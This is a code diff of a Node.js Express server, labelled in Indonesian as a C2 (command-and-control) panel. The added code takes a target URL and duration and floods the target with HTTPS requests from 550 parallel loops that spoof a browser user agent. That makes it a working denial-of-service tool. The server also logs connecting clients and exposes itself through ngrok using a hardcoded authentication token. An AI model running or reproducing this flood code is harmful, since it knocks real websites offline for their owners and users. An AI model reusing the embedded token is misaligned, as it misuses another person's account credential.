@@ -1,48 +1,60 @@
 const express = require("express");
-const app = express();
-const cors = require("cors");
-const os = require("os");
+const ngrok = require("ngrok");
 const https = require("https");
-const fs = require("fs");
+const bodyParser = require("body-parser");
 
-app.use(cors());
-app.use(express.json());
+const app = express();
+const port = Math.floor(Math.random() * (60000 - 3000) + 3000);
 
-let currentTarget = null;
-let attackTime = 0;
+app.use(bodyParser.json());
+
+let connectedClients = [];
+
+app.post("/connect", (req, res) => {
+  const ip = req.ip || req.headers["x-forwarded-for"] || "Unknown IP";
+  connectedClients.push(ip);
+  console.log(`[C2] TERHUBUNG DARI CLIENT: ${ip}`);
+  res.json({ status: "connected" });
+});
 
 app.post("/set", (req, res) => {
   const { target, time } = req.body;
-  currentTarget = target;
-  attackTime = time;
-  console.log(`[C2] Serangan dimulai ke ${target} selama ${time} detik`);
-  res.json({ status: "OK" });
-});
+  console.log(`[C2] TARGET: ${target}`);
+  console.log(`[C2] DURASI: ${time}`);
+  res.json({ status: "received" });
 
-app.get("/status", (req, res) => {
-  res.json({ target: currentTarget, time: attackTime });
-});
-
-app.get("/headers", (req, res) => {
-  res.json({
+  const parsedUrl = new URL(target);
+  const headers = {
     "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
-    "Accept": "text/html,application/xhtml+xml,application/xml",
-    "Accept-Encoding": "gzip, deflate, br",
-    "Connection": "keep-alive",
-    "Upgrade-Insecure-Requests": "1",
-  });
-});
+    "Accept": "*/*",
+    "Connection": "keep-alive"
+  };
 
-const PORT = Math.floor(Math.random() * (65535 - 1024) + 1024);
-const ifaces = os.networkInterfaces();
-let ip = "localhost";
+  const options = {
+    hostname: parsedUrl.hostname,
+    path: parsedUrl.pathname + parsedUrl.search,
+    method: "GET",
+    headers: headers
+  };
 
-for (let iface in ifaces) {
-  for (let i of ifaces[iface]) {
-    if (i.family === "IPv4" && !i.internal) ip = i.address;
+  const end = Date.now() + parseInt(time) * 1000;
+  function send() {
+    if (Date.now() > end) return;
+    const req = https.request(options, () => {});
+    req.on("error", () => {});
+    req.end();
+    setImmediate(send);
   }
-}
 
-app.listen(PORT, () => {
-  console.log(`\nAPI C2NYA : http://${ip}:${PORT}\n`);
+  for (let i = 0; i < 550; i++) send();
 });
+
+(async () => {
+  app.listen(port, async () => {
+    console.log(`[C2] SERVER RUNNING ON PORT ${port}`);
+    await ngrok.authtoken("2xclrXeyimoudAtLmDQu7DibbSJ_42dYjd7bccEoCS23svLnA");
+    const url = await ngrok.connect(port);
+    console.log(`[C2] API C2NYA: ${url}`);
+    console.log(`[C2] MENUNGGU CLIENT UNTUK TERHUBUNG...`);
+  });
+})();
